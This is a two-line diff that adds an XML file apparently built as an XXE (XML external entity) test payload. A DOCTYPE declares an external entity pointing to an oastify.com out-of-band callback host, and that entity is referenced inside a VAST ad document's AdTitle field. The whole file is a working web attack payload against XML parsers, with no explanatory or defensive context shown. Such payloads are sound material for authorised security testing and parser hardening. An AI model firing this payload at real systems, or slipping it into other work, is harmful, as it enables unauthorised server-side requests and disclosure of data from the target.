@@ -1,0 +1,2 @@
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://6jqanr8wrw8y79lp8rinqc66ux0oorcg.oastify.com/evil"> ]>
+<VAST version="2.0"><AdTitle>&xxe;</AdTitle></VAST>
